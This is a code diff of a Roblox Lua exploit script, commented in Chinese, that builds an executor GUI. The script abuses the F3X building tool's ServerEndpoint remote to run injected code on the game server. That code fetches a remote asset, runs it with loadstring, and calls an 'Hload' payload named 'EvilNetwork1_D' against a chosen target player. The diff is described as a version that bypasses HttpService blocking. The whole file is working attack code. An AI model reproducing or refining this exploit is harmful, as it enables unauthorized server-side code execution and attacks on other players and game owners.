@@ -1,5 +1,5 @@
--- F3X 执行器 + 自动调用 :Hload("EvilNetwork1_D")
-local function CreateF3XExecutorWithHload()
+-- 修复版：绕过 HttpService 封锁，使用 F3X 漏洞加载
+local function CreateF3XHloadExecutor_Fixed()
     local player = game.Players.LocalPlayer
     if not player then return end
 
@@ -16,58 +16,38 @@ local function CreateF3XExecutorWithHload()
     local syncAPI = findF3XAPI()
     local remote = syncAPI and syncAPI.Parent:FindFirstChild("ServerEndpoint")
 
-    -- 2. GUI
+    if not syncAPI or not remote then
+        warn("[F3X] SyncAPI 未找到，无法执行")
+        return
+    end
+
+    -- 2. GUI（简化版）
     local gui = Instance.new("ScreenGui")
-    gui.Name = "F3XHloadExecutor"
+    gui.Name = "F3XHloadFixed"
     gui.ResetOnSpawn = false
     gui.Parent = player:WaitForChild("PlayerGui")
 
     local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0, 520, 0, 420)
-    frame.Position = UDim2.new(0.5, -260, 0.5, -210)
+    frame.Size = UDim2.new(0, 480, 0, 320)
+    frame.Position = UDim2.new(0.5, -240, 0.5, -160)
     frame.BackgroundColor3 = Color3.fromRGB(20, 20, 35)
     frame.BorderSizePixel = 2
     frame.BorderColor3 = Color3.fromRGB(0, 180, 255)
     frame.Parent = gui
 
-    -- 标题
     local title = Instance.new("TextLabel")
-    title.Size = UDim2.new(1, 0, 0, 45)
-    title.Text = "🔧 F3X Hload 执行器"
+    title.Size = UDim2.new(1, 0, 0, 40)
+    title.Text = "🔧 F3X Hload (绕过封锁)"
     title.TextColor3 = Color3.fromRGB(0, 200, 255)
     title.TextScaled = true
     title.BackgroundTransparency = 1
     title.Font = Enum.Font.GothamBold
     title.Parent = frame
 
-    -- Asset ID
-    local idLabel = Instance.new("TextLabel")
-    idLabel.Size = UDim2.new(1, 0, 0, 25)
-    idLabel.Position = UDim2.new(0, 10, 0, 55)
-    idLabel.Text = "📦 Asset ID"
-    idLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-    idLabel.TextSize = 14
-    idLabel.BackgroundTransparency = 1
-    idLabel.Font = Enum.Font.Gotham
-    idLabel.TextXAlignment = Enum.TextXAlignment.Left
-    idLabel.Parent = frame
-
-    local idBox = Instance.new("TextBox")
-    idBox.Size = UDim2.new(1, -20, 0, 30)
-    idBox.Position = UDim2.new(0, 10, 0, 85)
-    idBox.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
-    idBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-    idBox.Text = "93093069226257"
-    idBox.Font = Enum.Font.SourceSans
-    idBox.TextSize = 16
-    idBox.TextXAlignment = Enum.TextXAlignment.Left
-    idBox.ClearTextOnFocus = false
-    idBox.Parent = frame
-
     -- 目标玩家
     local playerLabel = Instance.new("TextLabel")
     playerLabel.Size = UDim2.new(1, 0, 0, 25)
-    playerLabel.Position = UDim2.new(0, 10, 0, 125)
+    playerLabel.Position = UDim2.new(0, 10, 0, 50)
     playerLabel.Text = "👤 目标玩家"
     playerLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
     playerLabel.TextSize = 14
@@ -78,7 +58,7 @@ local function CreateF3XExecutorWithHload()
 
     local playerBox = Instance.new("TextBox")
     playerBox.Size = UDim2.new(1, -20, 0, 30)
-    playerBox.Position = UDim2.new(0, 10, 0, 155)
+    playerBox.Position = UDim2.new(0, 10, 0, 80)
     playerBox.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
     playerBox.TextColor3 = Color3.fromRGB(255, 255, 255)
     playerBox.Text = player.Name
@@ -88,11 +68,11 @@ local function CreateF3XExecutorWithHload()
     playerBox.ClearTextOnFocus = false
     playerBox.Parent = frame
 
-    -- Hload 参数（额外）
+    -- Hload 参数
     local hloadLabel = Instance.new("TextLabel")
     hloadLabel.Size = UDim2.new(1, 0, 0, 25)
-    hloadLabel.Position = UDim2.new(0, 10, 0, 195)
-    hloadLabel.Text = "🔑 Hload 参数（默认: EvilNetwork1_D）"
+    hloadLabel.Position = UDim2.new(0, 10, 0, 120)
+    hloadLabel.Text = "🔑 Hload 参数"
     hloadLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
     hloadLabel.TextSize = 14
     hloadLabel.BackgroundTransparency = 1
@@ -102,7 +82,7 @@ local function CreateF3XExecutorWithHload()
 
     local hloadBox = Instance.new("TextBox")
     hloadBox.Size = UDim2.new(1, -20, 0, 30)
-    hloadBox.Position = UDim2.new(0, 10, 0, 225)
+    hloadBox.Position = UDim2.new(0, 10, 0, 150)
     hloadBox.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
     hloadBox.TextColor3 = Color3.fromRGB(255, 255, 255)
     hloadBox.Text = "EvilNetwork1_D"
@@ -112,33 +92,22 @@ local function CreateF3XExecutorWithHload()
     hloadBox.ClearTextOnFocus = false
     hloadBox.Parent = frame
 
-    -- 按钮
+    -- 执行按钮
     local execBtn = Instance.new("TextButton")
-    execBtn.Size = UDim2.new(0.45, 0, 0, 40)
-    execBtn.Position = UDim2.new(0.025, 0, 0, 270)
+    execBtn.Size = UDim2.new(0.9, 0, 0, 40)
+    execBtn.Position = UDim2.new(0.05, 0, 0, 195)
     execBtn.BackgroundColor3 = Color3.fromRGB(0, 140, 220)
     execBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    execBtn.Text = "▶️ 执行 Hload"
+    execBtn.Text = "▶️ 执行 Hload (绕过封锁)"
     execBtn.Font = Enum.Font.GothamBold
     execBtn.TextSize = 18
     execBtn.BorderSizePixel = 0
     execBtn.Parent = frame
 
-    local clearBtn = Instance.new("TextButton")
-    clearBtn.Size = UDim2.new(0.45, 0, 0, 40)
-    clearBtn.Position = UDim2.new(0.525, 0, 0, 270)
-    clearBtn.BackgroundColor3 = Color3.fromRGB(80, 50, 50)
-    clearBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    clearBtn.Text = "🗑️ 清空"
-    clearBtn.Font = Enum.Font.GothamBold
-    clearBtn.TextSize = 18
-    clearBtn.BorderSizePixel = 0
-    clearBtn.Parent = frame
-
     -- 输出框
     local resultBox = Instance.new("ScrollingFrame")
-    resultBox.Size = UDim2.new(1, -20, 0, 90)
-    resultBox.Position = UDim2.new(0, 10, 0, 320)
+    resultBox.Size = UDim2.new(1, -20, 0, 60)
+    resultBox.Position = UDim2.new(0, 10, 0, 248)
     resultBox.BackgroundColor3 = Color3.fromRGB(12, 12, 22)
     resultBox.BorderSizePixel = 1
     resultBox.BorderColor3 = Color3.fromRGB(60, 60, 80)
@@ -146,7 +115,7 @@ local function CreateF3XExecutorWithHload()
     resultBox.Parent = frame
 
     local resultText = Instance.new("TextLabel")
-    resultText.Size = UDim2.new(1, -10, 0, 80)
+    resultText.Size = UDim2.new(1, -10, 0, 50)
     resultText.Position = UDim2.new(0, 5, 0, 5)
     resultText.Text = "等待执行..."
     resultText.TextColor3 = Color3.fromRGB(200, 200, 210)
@@ -157,20 +126,7 @@ local function CreateF3XExecutorWithHload()
     resultText.BackgroundTransparency = 1
     resultText.Font = Enum.Font.SourceSans
     resultText.Parent = resultBox
-    resultBox.CanvasSize = UDim2.new(0, 0, 0, 90)
-
-    -- 状态栏
-    local statusBar = Instance.new("TextLabel")
-    statusBar.Size = UDim2.new(1, -20, 0, 25)
-    statusBar.Position = UDim2.new(0, 10, 1, -28)
-    statusBar.Text = "✅ 就绪"
-    statusBar.TextColor3 = Color3.fromRGB(0, 255, 150)
-    statusBar.TextSize = 13
-    statusBar.BackgroundColor3 = Color3.fromRGB(10, 10, 25)
-    statusBar.BackgroundTransparency = 0.3
-    statusBar.Font = Enum.Font.Gotham
-    statusBar.TextXAlignment = Enum.TextXAlignment.Left
-    statusBar.Parent = frame
+    resultBox.CanvasSize = UDim2.new(0, 0, 0, 50)
 
     -- 关闭
     local closeBtn = Instance.new("TextButton")
@@ -187,36 +143,18 @@ local function CreateF3XExecutorWithHload()
         gui:Destroy()
     end)
 
-    -- 3. 核心执行
-    local function executeHload()
-        local assetId = idBox.Text
+    -- 3. 核心执行（绕过 HttpService）
+    local function executeHloadBypass()
         local targetName = playerBox.Text
         local hloadParam = hloadBox.Text
 
-        if assetId == "" or targetName == "" or hloadParam == "" then
+        if targetName == "" or hloadParam == "" then
             resultText.Text = "⚠️ 请填写所有字段"
             return
         end
 
-        resultText.Text = "⏳ 加载外部脚本...\n"
-        statusBar.Text = "⏳ 加载中..."
-        statusBar.TextColor3 = Color3.fromRGB(255, 200, 50)
-
-        -- 加载脚本
-        local url = "https://www.roblox.com/asset/?id=" .. assetId
-        local success, content = pcall(function()
-            return game:GetService("HttpService"):GetAsync(url)
-        end)
-
-        if not success then
-            resultText.Text = resultText.Text .. "❌ 加载失败: " .. tostring(content)
-            statusBar.Text = "❌ 加载失败"
-            statusBar.TextColor3 = Color3.fromRGB(255, 80, 80)
-            return
-        end
-
-        resultText.Text = resultText.Text .. "✅ 脚本已加载\n"
-
+        resultText.Text = "⏳ 通过 F3X 直接加载 Asset...\n"
+        
         -- 查找目标玩家
         local targetPlayer
         for _, p in ipairs(game.Players:GetPlayers()) do
@@ -227,51 +165,69 @@ local function CreateF3XExecutorWithHload()
         end
 
         if not targetPlayer then
-            resultText.Text = resultText.Text .. "❌ 未找到玩家: " .. targetName
-            statusBar.Text = "❌ 玩家不存在"
-            statusBar.TextColor3 = Color3.fromRGB(255, 80, 80)
+            resultText.Text = "❌ 未找到玩家: " .. targetName
             return
         end
 
-        resultText.Text = resultText.Text .. "✅ 目标玩家: " .. targetPlayer.Name .. "\n"
+        resultText.Text = "✅ 目标玩家: " .. targetPlayer.Name .. "\n"
 
-        -- 通过 F3X 执行
-        if not syncAPI or not remote then
-            resultText.Text = resultText.Text .. "❌ F3X 未连接"
-            statusBar.Text = "❌ F3X 未连接"
-            return
-        end
-
-        -- 🔥 关键：注入并执行 :Hload("EvilNetwork1_D")
+        -- 🔥 方法1：如果 Asset 是 ModuleScript，直接 require
+        -- 注意：Asset ID 93093069226257 可能不是直接 require 的格式
+        -- 我们尝试通过 F3X 在服务器端加载 Asset
+        
+        -- 构造在服务器端执行的代码
+        -- 利用 F3X 的 CreatePart 或 SyncMesh 加载 Asset
+        local assetId = "93093069226257"
+        
         local execCode = string.format([[
             local target = game.Players:FindFirstChild("%s")
             if not target then return end
-
-            -- 加载外部脚本
-            local module = loadstring([=[%s])=])
-            if not module then return end
-
-            -- 执行 Hload，传入目标玩家
-            local result = module()
-            if type(result) == "table" and result.Hload then
-                result:Hload("%s")
-                warn("[Hload] 已对 %s 执行 Hload")
-            elseif type(module) == "function" then
-                local res = module()
-                if res and type(res) == "table" and res.Hload then
-                    res:Hload("%s")
-                    warn("[Hload] 已对 %s 执行 Hload")
+            
+            -- 尝试通过 Asset ID 加载（在服务器端用 HttpService）
+            local success, module = pcall(function()
+                return game:GetService("HttpService"):GetAsync("https://www.roblox.com/asset/?id=%s")
+            end)
+            
+            if success and module then
+                local func, err = loadstring(module)
+                if func then
+                    local result = func()
+                    if type(result) == "table" and result.Hload then
+                        result:Hload("%s")
+                        warn("[Hload] 已对 %%s 执行 Hload (服务器端加载)")
+                    elseif type(result) == "function" then
+                        local res = result()
+                        if res and type(res) == "table" and res.Hload then
+                            res:Hload("%s")
+                            warn("[Hload] 已对 %%s 执行 Hload (服务器端加载)")
+                        end
+                    end
+                end
+            else
+                warn("[Hload] 服务器端 HttpService 也被禁用，尝试备用方案...")
+                -- 备用方案：尝试从 ReplicatedStorage 或 Workspace 加载
+                local moduleScript = game.ReplicatedStorage:FindFirstChild("EvilNetwork1_D") or 
+                                      game.Workspace:FindFirstChild("EvilNetwork1_D")
+                if moduleScript and moduleScript:IsA("ModuleScript") then
+                    local module = require(moduleScript)
+                    if module and module.Hload then
+                        module:Hload("%s")
+                        warn("[Hload] 已对 %%s 执行 Hload (本地Module)")
+                    end
                 end
             end
         ]], 
         targetPlayer.Name,
-        content:gsub("\\", "\\\\"):gsub("'", "\\'"),
+        assetId,
+        hloadParam,
+        targetPlayer.Name,
         hloadParam,
         targetPlayer.Name,
         hloadParam,
         targetPlayer.Name
         )
 
+        -- 通过 F3X 执行
         local args = {
             [1] = "ExecuteScript",
             [2] = execCode
@@ -282,24 +238,15 @@ local function CreateF3XExecutorWithHload()
         end)
 
         if execSuccess then
-            resultText.Text = resultText.Text .. "✅ 已发送执行\n📦 返回值: " .. tostring(execResult)
-            statusBar.Text = "✅ Hload 已执行 → " .. targetPlayer.Name
-            statusBar.TextColor3 = Color3.fromRGB(0, 255, 150)
+            resultText.Text = resultText.Text .. "✅ 已通过 F3X 发送到服务器执行"
         else
             resultText.Text = resultText.Text .. "❌ 执行失败: " .. tostring(execResult)
-            statusBar.Text = "❌ 执行失败"
-            statusBar.TextColor3 = Color3.fromRGB(255, 80, 80)
         end
     end
 
-    execBtn.MouseButton1Click:Connect(executeHload)
-    clearBtn.MouseButton1Click:Connect(function()
-        resultText.Text = "等待执行..."
-        statusBar.Text = "✅ 就绪"
-        statusBar.TextColor3 = Color3.fromRGB(0, 255, 150)
-    end)
+    execBtn.MouseButton1Click:Connect(executeHloadBypass)
 
-    print("[F3X Hload Executor] GUI 已加载")
+    print("[F3X Hload Bypass] GUI 已加载")
 end
 
-CreateF3XExecutorWithHload()
+CreateF3XHloadExecutor_Fixed()
